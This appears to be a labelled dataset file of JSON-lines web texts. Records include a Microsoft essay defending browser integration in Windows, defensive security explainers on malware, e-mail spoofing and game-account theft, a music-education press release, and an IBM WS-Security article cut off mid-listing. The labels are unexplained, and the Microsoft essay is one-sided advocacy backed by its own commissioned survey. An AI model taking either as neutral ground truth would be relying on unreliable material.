on the Internet. Anytime you see text in the format www.microsoft.com, you're looking at a URL (\"Uniform Resource Locator\"). This is simply a way to uniquely describe the location of a file that lives on the Internet, which is comprised of information stored on a large number of computers around the world. Without such unique addresses, it would be impossible to locate particular files on the Internet.\nThe goal of the IETF/W3C in creating these standards has been to enable and encourage universal exchange of information. Any application is allowed (even encouraged) to read and display HTML files. And as more applications do this, life becomes easier for both users and application developers—it becomes easier for people to exchange information. (If you're developing an application that creates HTML files, you know that lots of people will be able to read them, for example.)\nAn important thing to understand about the Internet standards committees, however, is that their job is to decide on the standards but not actually to write the computer code that implements the standards in software products. When the W3C creates the next version of the HTML standard, for example, they do it by writing a lengthy specification document, not by writing any actual computer code that draws HTML on the screen or that edits HTML documents. The task of writing the computer code is left to teams of software developers in individual companies or universities, etc.\nThe situation is a lot like the one that prevailed after the Microsoft Excel team designed the first toolbar—the W3C designs a great way for applications to universally exchange information, but each application vendor still needs to write the computer code to permit such information exchange to work in their application. Back between 1993 and 1996, lots and lots of companies were separately writing the same computer code to support all the standards created by the IETF/W3C—code to read and display HTML, code to get files from computers on the Internet, code to locate files using their URLs. This involved (and still does) a major duplication of effort, and a lot of work for individual application vendors.\nInternet Technologies in Windows - Making it Easier for Software Vendors\nFrom the very outset, Microsoft intended Windows 95 to support the broadest possible range of networks, including the Internet. That is why the development of Windows 95, code-named \"Chicago\", included work on a variety of Internet-related technologies, code-named \"O'Hare\"—a point of departure to distant places from Chicago. These technologies were later referred to by the name \"Internet Explorer\", and Internet Explorer 1.0 was an integrated element of the first version of Windows 95 provided to computer manufacturers, 2 ½ years ago.\nIn 1996, Microsoft created \"Internet Explorer 3.0,\" a greatly improved set of Internet-related technologies which are built-in to every version of Windows. You may regard \"Internet Explorer\" as just a web browser application, but that would be quite an inaccurate way to think of it. In fact, \"Internet Explorer\" describes two things:\nA set of platform technologies that any software vendor can use to make their application support Internet standards.\nA user-interface that any consumer can use to view web-sites on the Internet or any other internet-standards-based network.\nThe first of these two things—the platform technologies—work just like the support for toolbars that Microsoft made a native part of Windows that anyone could use. Instead of requiring every separate software developer to assign a team of people the task of implementing computer code for handling Internet standards, Microsoft has written the code once and made it possible for anyone to use it.\nIt's worth pointing out the significance of this statement. When Microsoft developers wrote the computer code that provides Internet Explorer functionality, they set out to design and build a set of operating system services. This is very unlike Netscape Navigator, which is a free-standing application that does not provide a broad set of operating system services to 3rd party software developers.\nIn fact, every single pixel you see on the screen when you use the Internet Explorer browsing window was put there by operating system services that any vendor creating Windows-based applications can use. That is a huge efficiency and enables software developers to focus their energies on adding attractive new features to their products rather than focusing on the low-level plumbing required to handle Internet standards.\nThere are lots of examples already of applications using these platform services – even Windows itself relies on some of them to provide services to computer users. Let's look at three examples:\nHTML Help. Today, the majority of applications written for Windows include \"help\" files along with their application. Most users expect this, so it's work that application developers need to do before they can market their products. Up until now, application vendors created their \"help\" files using a service of Windows known as \"Winhelp\".\nThe Winhelp system included a set of tools for software developers to author \"help\" files keyed to their particular application. After those specialized \"help\" files were created using those tools, they were compiled into a special Winhelp format, and the process was complete.\nUnfortunately, because Winhelp was created before there was a rich document format like HTML in broad use, the Winhelp files that software developers created were not universally viewable. You couldn't easily create a document with images, animations and hyperlinks and make it available to everyone (they had to have Winhelp). You couldn't put the document on a network and enable people to view it from their machines, etc. Furthermore, there weren't a wide variety of tools available for authoring these \"help\" files.\nToday, Microsoft has revamped the help system in Windows to base it on HTML, the universal document format. (Screen shot at left.)\nThis means that when an application vendor authors help files, the document created is universally viewable, and a much broader range of tools can be used to create it. Furthermore, the HTML standard is much richer than Winhelp was, so the content of help files can be made much better U even the background image at left wasn't possible with the old Winhelp system.\nIn Windows 98, Help for Windows itself has been rewritten to the HTML format. This was easier for the Windows Help team to produce, and it results in a better experience for the end user. In creating Windows 98 Help, the team also added some enhancements to HTML—offering features like compression—and thus converting an old proprietary system to align it with today's open Internet standards.\nAll this wouldn't be possible if support for HTML display wasn't built-in to the operating system. In order for any 3rd party software developer to decide to include HTML-based files as part of their application, they need to be assured that those files can be displayed on any machine—they need to know that users will not have to buy or download an additional viewer. In the same way application vendors can rely on the fact that support for toolbars is built into Windows, they can also rely on HTML support in the operating system.\nApplication User Interfaces. Over the years, application vendors have employed various services in the operating system to draw parts of their user-interface on the screen. When you look at an application like Lotus Notes, Microsoft Publisher or Corel Wordperfect—and in particular when you open a dialog box in one of these applications—the gray user-interface elements you see were probably created by the application asking Windows to draw them.\nThese user interfaces have worked well enough for the last 5 years, but now something better has come along.\nThe HTML standard, as a universal document format, is a great way to describe how user interface elements should be displayed on the screen. (Those elements need no relationship to a \"web page\" or to the Internet at all.) In fact, the basic screens of today's applications are terrific candidates for being authored in HTML. HTML offers very rich and attractive visual options, and furthermore—because it's an open standard—the tools that exist for creating HTML are very good and getting better quickly.\nThis means that it's possible for software developers to create better user-interfaces more easily by writing them in HTML. And today—now that Microsoft has included support for HTML in Windows itself—application vendors are beginning to take advantage of HTML's benefits without having to do all the work of writing the computer code necessary to display HTML themselves. One additional benefit of calling upon operating system services in Windows to display HTML is that if an application wants to include a page of content that does come from the Internet, it takes no additional work to display that as well. This makes for richer applications and less work for 3rd party software developers.\nThere are a lot of examples already of applications taking advantage of the HTML-rendering support built into WindowsUprobably more than you'd think. Here's a partial list:\nProComm95, ProComm Plus32 (Quarterdeck)\nIPublish (Design Intelligence)\nNorton System Genie (Symantec)\nMoney98 (Microsoft. HTML user interface shown at right)\nOutlook, Outlook Express (Microsoft)\nWindows desktop (control panel, folders, explorer, etc.)\nSaving and Opening files from the Internet. You've undoubtedly taken it for granted that any new application you buy will enable you to save and open files on the hard disk inside your computer. You've probably also taken it for granted that the same application can save and open files from your Local Area Network if you have one. Of course, both these facts weren't always the case—before those capabilities were built into the operating system.\nToday, it's becoming very important for applications to be able to save and open files from the Internet. You may not realize how important this is yet, but over time the Internet will become a more routine place for you to save and open files than even your local hard disk. Think of the potential benefits—you could get to your files from work, home, or any random airport; perhaps someone will back them up automatically for you. (In fact, today one company—@Backup—is building a business doing just this.) Already, lots of important scenarios, like creating your own web page, sharing documents with people outside your company, etc., require applications to be able to open and save files from the Internet.\nThis is another example of a platform service that's built into Windows in the portion of the operating system referred to as Internet Explorer. Again, you probably aren't even aware that some applications you're using now are able to save and open files from the Internet by taking advantage of this platform service provided by Windows.\nHere's one exampleUthe dialog box below is part of Microsoft Word 97, and the image shows how it's possible to open Microsoft Word documents from the Internet, on any FTP server. The Word development team created this new feature by utilizing Windows' built-in ability to open or save files from the Internet.\nPlatform Services - Doesn't integration harm other peoples' businesses?\nA common question relating to integration of new platform services into the Windows operating system is whether this practice is good for consumers and potentially harmful to Microsoft's competitors.\nWe thought the best way to respond to this was to ask software developers themselves, so we commissioned a 3rd party to survey a sample of software vendors that included both Microsoft competitors and partners.\nWe asked specifically about how the integration of Internet technologies in Windows would affect their business. Here's what they said:\n85% said this integration will have a positive impact on their company\n83% said there will be positive impacts for end users\n80% said there will be positive impacts for the software industry as a whole\n79% said it will be easier to create new applications and bring new capabilities to their customers as a result of the integration\nFurthermore, you may wonder whether software developers as a whole think that integration of new innovations into existing software products contributes to the success of the software industry. In fact, the survey showed that the industry is growing as this phenomenon has been occurring—86% of software developers surveyed said their sales are increasing; while only 2% said their sales are declining.\nOften, people claim that features built into the operating system by Microsoft make 3rd party solutions unnecessary, and that this harms the businesses of other companies. If you look at some actual case studies, however, it becomes clear that integration is not the primary determinant of the continued success of such companies.\nMSN & Exchange Email – When Windows 95 shipped, the client software for the MSN online information service and a Microsoft Exchange email client were built into the operating system. The email client in particular is a great analogy to Internet Explorer. A significant part of the email client includes 3rd party services that any application can use (these are known as \"MAPI\" or Mail API), very much like the operating system services provided by the Internet Explorer component of Windows. In both these cases, the solutions built into Windows did not have any significant adverse effect on companies producing competing products—in fact, other online information services like AOL and many other email clients are doing very well compared to Microsoft's product offerings. This simply proves the point that consumers use what they like, regardless of whether something is included in Windows. Thus, if a competing product provides a more compelling user experience than a feature of Microsoft's operating system, consumers will opt for that competing product.\nInternet Explorer versions 1 & 2. These initial versions of Internet Explorer were built into every single version of Windows 95 preinstalled on new PCs—if you bought a new PC, it included Internet Explorer as an integrated part of the operating system. During those years, Netscape Navigator rocketed to extremely high usage rates, which occurred despite the fact that a variety of Internet technologies, including web-browsing functionality, were built into Windows. (Note: Netscape Navigator can also be preinstalled on brand-new PCs—Microsoft allows computer manufacturers to add whatever software icons they like to the Windows desktop.)\nIn product reviews, early versions of Navigator consistently were picked as better than Internet Explorer. It wasn't until Microsoft created Internet Explorer 3.0 (and now 4.0) that reviewers chose Internet Explorer as superior to Netscape Navigator. And it has been during this more recent era that Internet Explorer's popularity has begun to increase compared to Netscape Navigator, proving once again that consumers can be depended upon to use the products they like.\nFile Management Utilities. When Windows 3.1 was very popular (before Windows 95 had shipped), a number of companies made very good businesses out of selling file management and other similar utilities for Windows. The Norton Desktop and Norton Utilities were a great example. As Windows 95 was being finished, many people believed that its built-in utilities (better file manager, built-in customizable desktop, graphical disk tools) would greatly diminish the popularity of the Norton products. However, what actually happened was that the developers of those products saw that Windows 95 presented them with an opportunity. They upgraded and revised their utilities, building on new platform services provided by Windows to provide new value to consumers above and beyond that being built into the operating system. As a result, Symantec's Norton Utilities for Windows 95 became a best-selling software package.\nFinally, people sometimes wonder why Microsoft requires computer manufacturers and others who distribute Windows to include the complete platform of services, and not to pick-and-choose just the ones they want. The answer is simple—unless software developers can know in advance that the services they want to use (toolbars, sound, internet standards) will be present on a user's computer, then they must include that support in their own products. When that happens, it makes application installation more difficult, time-consuming and error-prone. (You may have seen those cryptic messages when installing a new application: \"The file FOOBAR.DLL being copied is older than the one on your system. Do you want to keep the present one?\" Huh?) By clearly defining the operating system services that are provided by Windows, we contribute to making application installation simple and reliable.\nOverall, we firmly believe that integration of new platform services into Windows—and in particular support for Internet standards—provides great benefits to the community of application developers and therefore creates an improving environment for end-users. And we aren't the only operating system vendor who thinks this—Sun Microsystems has built Internet technologies into Solaris 2.6, and IBM has done the same with OS/2 Warp 4.\nIntegrating the User Interface to Benefit End-Users\nWe've explained the principle behind integration and the assistance that integration provides to software developers in keeping up with the ever-changing demands of consumers by freeing them to focus on improving the unique aspects of their products. We haven't yet discussed how integration is also beneficial to end-users.\nIn the general case, when new computer technologies are created, they tend to be added to Microsoft's user-interfaces as \"new components\". Often, the new component—perhaps a whole new application—has its own quirky characteristics compared to the old ones, and it takes quite a bit of learning for consumers to know how to use them both together.\nA good example of this would be the separate programs in Windows 3.1 for managing files, printers, programs and other system settings. Back in those days, it was easier for us to just add another new program—even though it was different from the others—rather than to rewrite everything so that a single-user interface made it possible for a user to obtain easy access to all such information.\nIn Windows 95, one of the more significant steps forward was a single user interface paradigm—the \"folder\"—for access to everything from the files on your hard disk or LAN, to the printers in your office or printer room, to the settings for your modem. The nice thing about this is that once you've learned how to get to files on your hard disk, you already know how to get to everything else.\nThe same paradigm holds for integration of user-interfaces used to browse information kept in different kinds of storage devices. In fact, the evolution of the Internet has offered a lot of new user interface paradigms that Microsoft is using to make the Windows user interface better. Innovations like hyperlinks, back/next buttons, and type-in addresses make the whole PC easier to use.\nLet's take just one example. In older versions of Windows, as you browse through your hard disk, you get multiple overlapping windows with no way to move between them when you go from place to place. When you use the browsing paradigms developed for navigating the Internet, you get a single window with back/next buttons, and it's easier to move from one file to another quickly, even if one is in Buffalo and the other in San Diego.\nMaking the Windows user interface work the same as web browsing software—and even better, making it so you can access locally and remotely stored information from just one window—means the whole concept of browsing any kind of content is just plain easier. What's more, integration of web-standards in the Windows user interface makes it possible to provide compelling and useful new features like the file preview shown at left possible.\nSummary – Integration Makes Greater Innovation Possible\nAs the creators of the Windows operating system, we at Microsoft believe that perhaps the most significant part of our job is to make Windows a continually better platform, and in particular, to:\nDeliver to application vendors the most important and useful platform services, so they can use those services as a foundation upon which to build their own innovative solutions to customers' needs.\nContinue to make Windows an easy, comprehensive environment for end-users, so that the common tasks they want to do with their PCs are as simple and straightforward as possible.\nWe believe that the development of Internet standards has created a massive opportunity for the PC industry and for people who use PCs. We believe that it is our responsibility to provide enabling technology to bring those Internet standards to as many applications and as many people as possible.", "label": 1}
{"text": "The USB drive is a handy little gadget that serves the purpose once reserved for floppy disks and Zip drives. It’s commonly used to move folders, files, and data easily from one computer to another in a format that’s often small enough to be given a second job as a key chain. There’s no need to burn data into the drive as you would with a CD or DVD; you can erase from and overwrite onto the USB drive as often as you need to until the darned thing falls apart. Add the fact that even USB drives capable of storing relatively large amounts of data are pretty darned cheap nowadays and you’ve got an ideal little workhorse for those files that you want to be able to use between the office, home, laptop, band camp, coffee shop, cyberpub, school, or wherever, really. One might wonder if a miraculous device so well suited to carting your data all over creation might have any alternative uses — wonder no more! You can also use a USB drive to boost your computer’s performance and run portable applications.\nWhat’s a portable application? Think about the files that you want to take from one computer to another — the reason you’re using a USB drive in the first place. Now think larger: Wouldn’t it be nice if you could use entire applications between computers without having to install them onto each system? There you go! Simply put, that’s what portable applications are. Mozilla’s Firefox Web browser, The OpenOffice suite of free Microsoft Office replacement applications, Google’s Chrome Web browser, and the Miranda IM client are just a few examples of portable applications that can be used directly from a USB drive. Looking a little further, you’ll find that everything from games to space simulators to Bible study to sound editors to the Skype VoIP service can also be used as portable applications from a USB drive.\nA few words of caution: Because a USB drive is so easy to use, it’s especially susceptible to viruses and malware, and because of its portable nature, it can serve as an unwitting carrier of such viruses and malware between computers. Make sure you’re using reliable sources to download portable apps (and really, haven’t we learned that this is a good idea no matter what it is we’re downloading?); one such recommended source is PortableApps.com.\nDepending on your operating system, knowing how to use a USB drive to run portable applications is as easy as your usual method of saving to or running regular applications from any other hard drive on your computer. The hard drives view on my computer (still running on Windows Vista, I’m moderately ashamed to say) looks like this before I add a USB drive:\nAnd then like this after the USB drive is added (notice the new Removable Disk “J” drive):\nDouble clicking on that J drive will show me everything that’s currently on that drive. Double clicking on a portable application stored on that drive will run it on my computer — just as it would with any natively stored application. It’s really as easy as that! For an even easier time of it, the aforementioned PortableApps.com has an excellent platform for helping you add, delete, manage, and update portable applications.\nDo you regularly use any portable applications from a USB drive? Let us know what your experience has been and if you recommend any for our fellow LockerGnome readers.", "label": 1}
{"text": "What is the difference between a virus, trojan and a rootkit\nA virus is a program or script written with an objective; collecting data, gaining control of a system, or opening a back door for future access to the system. A trojan is a program that caries a payload of a rootkit or a virus. A rootkit, much like a virus has an objective but functions at a lower level in the system. These are harder programs to identify and to remove. They function a the base layer of the operating system or can get into the boot sector of the operating system and infect the bios of the computer.\nWhat is Malware\nMalware stands for malicious software. it is any software designed with the intent of interrupting services. This includes trojans, viruses and rootkits.\nWhat is a Phishing Attack\nA phishing attack is an attack attempting to gather sensitive information. A Spear Phishing attack is a targeted phishing attack.", "label": 1}
{"text": "Press release from CNW Group\nPoll: Learning A Musical Instrument May Boost Life Long Success\nWednesday, April 06, 2011\nStudy shows Canadians who learned an instrument as a child reported higher levels of education; more than 2/3 believe it's just as important as sports or learning a second language.\nTORONTO, April 6 /CNW/ - If you learned to play a musical instrument as a child you are more likely to go further in school, according to a new XM Canada / Leger Marketing survey. In fact, seven out of 10 Canadians who learned a musical instrument as a child said it has had a positive effect on their lives and half agreed that learning an instrument helped them do better in school. Interestingly, 66 per cent of Canadians say learning an instrument is as important as learning a second language.\nThe positive impact wasn't just academics. Reported lifelong benefits of learning this skill which can be carried throughout a person's career included: increased mental focus (46%), heightened creativity (45%), building confidence (32%) and ability to self-teach (32%). The positive relationship between education and music struck a chord when the poll results showed that those who learned to play an instrument were more likely to be college or university educated versus those who didn't (69% vs. 59% respectively)\n\"Learning to play an instrument is a huge part of many Canadians' lives and has significant impact years later,\" said Janet Gillespie, Marketing Vice-President, XM Canada. \"Ensuring that Canadian children have access to music education is critical for keeping Canadian music alive and growing people not only culturally but personally. It's a prime reason that XM Canada proudly supports initiatives to develop musical talent through organizations such as S'Cool Life Fund and MusiCounts.\"\nIn November 2010, XM Canada collaborated with S'Cool Life Fund to launch a new called the XM Instrument Fund. This program will dedicate $100,000 to support the efforts of elementary schools across the country to refresh existing music programs and develop exciting new programming for students. The program is another example of XM Canada's commitment to support rising Canadian talent and encourage the artistic growth of the next generation of great performers and musicians. Recipient schools selected to receive the grant are expected to be announced by June 2011.\nThe first note\nCanadians understand the importance of an education in music and almost unanimously believe that every child should be afforded the opportunity to learn an instrument (94%). Those who did learn to play instruments customarily begin at the elementary school age (61%) and more than three quarters of Canadians who learned to play an instrument cited parents (49%) and teachers (35%) as their top motivators. Additionally, 77% of Canadians agree that learning a musical instrument is just as important as playing sports.\nRegret? You bet. The study also revealed that 72% of those who did not learn an instrument as a child regret it and more than half (62%) of Canadians who did learn an instrument regret giving it up and wish they could still play it today.\nAdditional Fast Facts\nAcross the country\n- Sixty-six percent of Canadians surveyed learned to play an instrument as a child.\n- Residents of Quebec (73%) and Alberta (71%) were the most likely to indicate that they learned to play an instrument.\n- Albertans are more likely than most to state that learning an instrument is as important as learning a second language (80%)\n- Interestingly, the flute was immensely popular in Quebec, where 45% say that they learned to play this instrument as a child.\nMusic talent - it's personal\n- Top three instruments Canadians learned as children? Piano (31%), Flute (18%), Guitar (15%)\n- Parents and teachers were the most common motivators for children learning to play an instrument but some said celebrities were their inspiration [Men (9%) vs. Women 4%)]\n- One third of Canadians said playing music was one of their favourite hobbies.\n- One in six respondents still play their instrument at least once a week.\n- Most Canadians admire accomplished musicians, and one third would give up their current jobs for a music career.\nFor morn information about MusiCounts please visit: www.musicounts.ca\nFor more information about S'Cool Life Fund please visit: www.scoollifefund.ca\nAbout the Survey\nThe survey was completed on-line from March 7, 2011 to March 10, 2011 using Leger Marketing's online panel, LegerWeb, with a sample of 1549 Canadians. A probability sample of the same size would yield a margin of error of 2.49%. Leger Marketing's online panel has approximately 360,000 members nationally - with between 10,000 and 20,000 new members added each month, and has a retention rate of 90 percent. Panel members are randomly selected to receive email invitations to the individual surveys. We ensure the protection of privacy via the usage of unique URLs and respondent IDs in combination with survey IDs.\nAbout Canadian Satellite Radio Holdings, Inc.\nCanadian Satellite Radio Holdings Inc. (TSX: XSR) operates as XM Canada and is Canada's premium digital audio entertainment and information company with the best signal coverage across the country. With 130 digital channels of choice, XM Canada offers Canadian listeners the most unique and original Canadian and international programming, including commercial-free music channels, exclusive live concerts and sports coverage, and the best in talk, comedy, children's and entertainment programming.\nXM Canada is the satellite entertainment leader in the Canadian automotive market with long-term factory installation agreements with manufacturers that own close to 50 per cent share of the domestic vehicle market. XM's industry-leading products are available at shop.xmradio.ca, and at retailers nationwide.\nXM programming is available by subscribing directly through XM Canada and is also available as streams of commercial-free XM music channels on TELUS Music Radio and Rogers Wireless Radio on Demand. XM Canada is the exclusive music channel provider on Air Canada's flights.\nTo find out more about Canadian Satellite Radio Holdings Inc. (TSX: XSR), visit: www.xmradio.ca/about/.\nNote to editors: Provincial/regional data available.\nFor further information:\nJill Yetman | Environics Communications, Inc. | 416-969-2722 | email@example.com", "label": 1}
{"text": "Mandatory Access Control\nIn computer security Mandatory Access Control (MAC) is a type of access control in which only the administrator manages the access controls. The administrator defines the usage and access policy, which cannot be modified or changed by users, and the policy will indicate who has access to which programs and files. MAC is most often used in systems where priority is placed on confidentiality.\nContrast with Discretionary Access Control (DAC) which is determined by the user with permission.\nFeatured Partners Sponsored\n- Increase worker productivity, enhance data security, and enjoy greater energy savings. Find out how. Download the “Ultimate Desktop Simplicity Kit” now.»\n- Find out which 10 hardware additions will help you maintain excellent service and outstanding security for you and your customers. »\n- Server virtualization is growing in popularity, but the technology for securing it lags. To protect your virtual network.»\n- Before you implement a private cloud, find out what you need to know about automated delivery, virtual sprawl, and more. »", "label": 1}
{"text": "- Campus Life\n- Cost & Aid\n- News & Events\n- About Plattsburgh\nYou've checked your machine with the latest version of anti-virus software. You've called the Helpdesk, and they sent someone over who gave your computer a clean bill of health. Yet, you still receive messages accusing you of spreading viruses to others via e-mail. Why?\nThe reason may be due to any number of viruses that cleverly \"spoof\" or fake the return addresses on the loaded e-mails they send. Such viruses gather e-mail addresses from the infected machine, choosing one to list as the destination (To:) and one to \"spoof\" (fake) as the sender (From:).\nMost mail systems will let you put anything down as the sender (From:)address without validating or authenticating it. So, someone else's macchine is spreading a virus but you get the notification because the virus found your e-mail address on the infected system.\nTo explain further, here is a sample scenario. Let's say firstname.lastname@example.org contracts a virus like MiMail. Some time after that, email@example.com receives a message from firstname.lastname@example.org that has a virus attachment in it. Leonardo's anti-virus software or his firewall catches it before it can infect his machine. The anit-virus or firewall software then sends a note to Isaac warning him that he is spewing out viruses. Isaac is totally confused as he knows that his firewall or anti-virus software would have caught it. As the interception of the virus and the notification are automatic, the actual messages are never examined to verify the sender's name. Had they been examined, they might have revealed that the original sender was from somewhere in sion.org.\nThe only one can do is make sure one's anti-virus software is up to date and working. The confusion over who actually sent the virus will continue until e-mail software and protocols evolve to address this gap in security (spoofing).\nFor more information about technology at SUNY Plattsburgh, please contact:\nPhone: (518) 564-4433 / toll-free 1-800-787-8773", "label": 1}
{"text": "Have you ever been unsure\nabout a trade that seems a\nlittle \"iffy,\" or something that just\ndoesn't seem right?\nThis guide could help you decide\nwhat to do when stuff like\nthat happens, and it\ncould one day save your account.\nImportant: First read CipSoft\nSecurity Information Page\nLast updated: February 20th, 2011\nAs defined in the dictionary, hacking is \"to use one's skill in computer programming to gain unauthorized access to a file or network.\" If someone gets your account password and account number, they might take all of your stuff on your character, or possibly even your character itself.\nWhat Bad Things are out There?\nThere are several ways someone can get your password to your account. Most can also do some bad things, not only to your Tibian account, but to your computer as well.\n|1. Trojans, Trojan Horses - These are malicious programs pretending to be a regular program. They can destroy data and send info back to the owner, such as passwords. The main difference between them and computer viruses is that they do not replicate.\n2. Viruses - Bad programs made by people to (usually) do bad things to computers. They can be disguised as games, pictures, or regular programs. When executed they could destroy information.\n3. Key Loggers - these are programs much like Trojans, but usually they don't destroy data. They keep track of every keystroke made, and then sends it back to the owner.\n4. Worms - Worms are viruses that sit in the computer's memory, duplicating themselves. They can be sent to other computers through an email program, or IRC (internet relay chat), destroying data.\n5. Spyware, Adware - Usually these come from programs with bundled software, like file sharing utilities. Both will track what sites you visit and what you do on them.\n6. Guessing Passwords - although unlikely, if you have an easy password, someone could guess it, or -- automated scripts with common words dictionaries embedded can \"break\" your easy-to-figure password too!\nHow Can A Person Get These?\nWith exception to #6, all the programs above can be gotten from a computer program. Sometimes they can be sent by email, a downloaded program, or a website. But, usually you will not find any of these things unless you're looking for a cheat to the game, or doing other... bad things.\nIf someone asks you to be their friend, and then tries to send you a file, reject it. Especially files with a .exe, .cmd, .bat, or .scr extension. Even if they want to send you a picture of them self, it'd advised not to accept it unless you absolutely trust the person. Ask them to upload it on a trusted image uploader instead.\nHow Not to Get Them?\nThere are lots of ways to be sure not to get any of the bad things mentioned earlier. Using your common sense is a good start!\n1. Don't download anything questionable, like character modifiers, add-on Tibia programs, or toolkits, unless its from a trusted fan site. CipSoft has deemed what they consider trusted fansites on their fansites page. Even then, please use extreme caution.\n• McAfee - can be bought in stores or online.8. Scan for Spyware using any popular program such as:\n• Ad-Aware - an excellent program that will get rid of adware and spyware, along with other harmful programs.\nHere are some tips to make your password almost un-guessable!\n• Make sure you have a password of around 8-10 characters or even more.\n• Don't use words from a dictionary. Instead, mix words together that don't make a real word, or even use a number or 2.\n• Don't use your name or phone number for a password. don't use words that a friend could think of using (if you and a friend play Diablo, don't use 'diablo' for a password).\n• Never give out your password - not even to a friend. Your 'friend' could turn out to be someone you don't know at all.\nMyths & Facts\nHere are a few common myths about these things.\nMyth: CIP or a Gamemaster needs my Account Number or Password\nFact: CipSoft will never ask you for your password, they do not need it. Nor a Gamemaster will do. Or a Counsellor. Or a Tutor.\nMyth: I can't trust any websites anymore!\nFact: Not all sites are bad, and about 99.8% of the ones you can find are good, and want to help you out. Unless you want to find a cheat or something, you won't find the other .2%.\nMyth: Having antivirus software and a firewall makes me invincible to bad stuff!\nFact: Although it does help a lot, you should still be careful.\nMyth: If you get a virus, you need to buy a new computer.\nFact: Absolutely not! There's a number of things you can do to fix it. For one, try getting a program mentioned above, such as Ad-Aware and try scanning. If that doesn't work, you could always choose the 'road less traveled by' and reformat, but sometimes it takes awhile.\nMyth: There are item duplicators.\nFact: If you read any post from people saying they have an item duplicator, or they contact you in-game saying they can duplicate your items, it's a guaranteed scam.\nMyth: There are magical start editing hacks!\nFact: That's a nonsense. All they want is your password or keylog you.\nHow keyloggers work\nThere are lots of keylogging programs out there today. I've seen lots, and I mean lots. But, the people here tend to use 2 types of keyloggers. Sc-Keylog and BlazingTools Perfect Keylogger (or BPK for short).\n1. Sc-Keylog: How this works; It is a file by itself, usually and .EXE. When you open it, you will see that nothing happens. Usually this means that the file is running in the background, and you can ALT+CTRL+DEL to find it in the 'Processes' tab.\n2. BPK: This program works by binding to another program, say tibia.exe. The program will run fine, but what you dont know is that it secretly installed BPK into your system. BPK will either send it to a person's e-mail or upload it to an FTP. In order for this to work, you need to supply a User+Pass for the e-mail or the website which you are uploading to. There are programs out that will decrypt the infected file, and will find their User+Pass that the provided. Payback! :)\nDespite everything.... \"I am hacked!\"\nWe are sorry to hear you have been hacked. Before you can get your account back there are certain things that you must take care of. If you do not remove your security problem first you risk being hacked again.\n1. Find out how the hacker got access to your account and remove the security problem. Carefully think over everything that has happened to your account and your computer during the last few weeks. Here are some questions that might help:• Is it possible that you have a computer virus or a spy program on your computer? Please use one or two up-to-date virus scanners to check your computer. If a virus is found remove it before you do anything else.\n• Did you share your account data with anybody? A person that knows your account data can easily hack you.Do not risk that again.\n• Is your email address safe? Try to secure your email address by changing the email password. To find out more about possible security leaks read Tibia's Security Hints carefully. If you follow these guidelines your account should be well protected against any further hacking attempts. Remember, if you try to get your account back before the security leak is removed it is quite possible that the hacker will again get access to your account.\n2. Get your account back. To get back access to your account you have to use the Lost Account Interface. Specify your problem there and follow the instructions. Please note that a new password will only be sent to the email address to which the account is registered. If you have lost access to this email address try to get it back. For example you can contact your email provider and ask for help. Once you have access to the registered email address the Lost Account Interface will work.", "label": 1}
{"text": "Over the past couple of years, web services has gone from being an overly-hyped technology to one that many organizations are using productively. The early implementations, like all new technology projects, tended to be sandbox-type efforts or projects that were small, inside the firewall, and non-mission-critical in nature. Those brave souls that tried to venture into the world of delivering web services over the Internet found that they either had to provide services that were open and available for use by anyone (for example XMethods or Amazon) or had to develop their own, typically proprietary, very company-specific, security scheme.\nEarly adopters using the Internet as their transport typically used some form of registration process (for example Google) for open Internet services or only provided services to a small number of business partners with whom they already had a tight, trusted relationship. For example, in order to use Google's web service-enabled search engine, the service requester must first register with Google through an HTML based form. As part of the registration process, Google sends the requester an email with a security \"token\". When the requester invokes the service, they provide this token to Google as part of the SOAP message to verify that they are a registered, authorized user of the Google web service.\nIn these situations, even though service providers were using industry standards such as SOAP, additional information concerning the security scheme/process needed to be provided in order for the service requestors to be able to use the service. This had a rather undesired effect of tightly coupling the requester and the provider, a scenario that wasn't desired by either party.\nClearly an industry standard way of securing a web service was required, and IBM, Microsoft, and VeriSign responded to this need in April, 2002. From the WS-Security specification (see also Resources):\n\"WS-Security describes enhancements to SOAP messaging to provide quality of protection through message integrity, message confidentiality, and single message authentication. These mechanisms can be used to accommodate a wide variety of security models and encryption technologies.\nWS-Security also provides a general-purpose mechanism for associating security tokens with messages. No specific type of security token is required by WS-Security. It is designed to be extensible (e.g. support multiple security token formats). For example, a client might provide proof of identity and proof that they have a particular business certification.\"\nSince 1997, IBM has had a program called jStart (short for jump-start -- see Resources) to help its customers and business partners work with new emerging technologies. The program's goal is to help early adopters leverage new technologies to help make their businesses more successful. Last fall, the jStart program worked with a company who wanted to provide a business-to-business web service using the Internet as a transport. They desired a strong level of security and interoperability, and they decided to use a WS-Security approach to secure the SOAP message traffic with their business partners. This paper discusses that project and its use of WS-Security.\nAs the use cases for our customer's application were being developed, a set of security-related, non-functional requirements were identified:\n- The communication between our customer and his business partner should not be able to be viewed by a third party as it travels on the Internet.\n- Our customer needed to be able to determine from whom the message was coming and be able to verify that the sender was who the sender claimed to be.\n- Our customer needed to be able to ensure that the data being transmitted was not tampered with.\nNon-functional requirement #1 will be addressed through the use of HTTPS/SSL transport security. Since this application will be a point-to-point application, with no third party service providers or intermediaries involved, the idea of using cryptography to encrypt all or part of the SOAP message was evaluated but not implemented at this time. Given no third parties were involved, the value gained from an additional encryption step that would encrypt a segment of the SOAP message was not enough to justify the additional development expense and complexity that would have been needed to implement a form of message-level encryption.\nNon-functional requirements #2 and #3 will be addressed through the use of digital signatures and digital certificates. When using a digital certificate approach, the web service requester must have a digital certificate which has been signed by a trusted certificate authority. The requester will use this certificate to assert their identity and will digitally sign the SOAP message so that the requester's identity and the message's integrity can be verified.\nOnce the message is received at our customer's system, it will be time stamped and logged. At this point, the digital signature will be validated. The validation process will ensure that the message came from the sender as well as verify that the message contents have not been modified since it was signed at the sender's site. The SOAP message log that our customer creates in DB2 will be used for non-repudiation purposes.\nNow that you understand the requirements and the technical approach, let's take a look at what was implemented. The application that our customer chose to implement as a web service was developed using WebSphere Studio Application Developer and some tools from the IBM alphaWorks web site, namely, the XML Security Suite, and the Apache Axis run time that was part of the IBM Web Services Toolkit. Although the application is quite powerful as it drives our customer's core business application, it is simple in that it only implements one method. It was deployed on WebSphere Application Server and interacts with the customer's core business application through WebSphere MQ Series.\nBy using the TCP/IP monitor that is part of Application Developer, we've captured the SOAP message that is sent to the web service for processing. Note that in order to maintain the confidentiality of our customer, we made the SOAP URLs generic, removed the application-specific SOAP payload, and slightly modified some of the calculated values:\n1. <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" 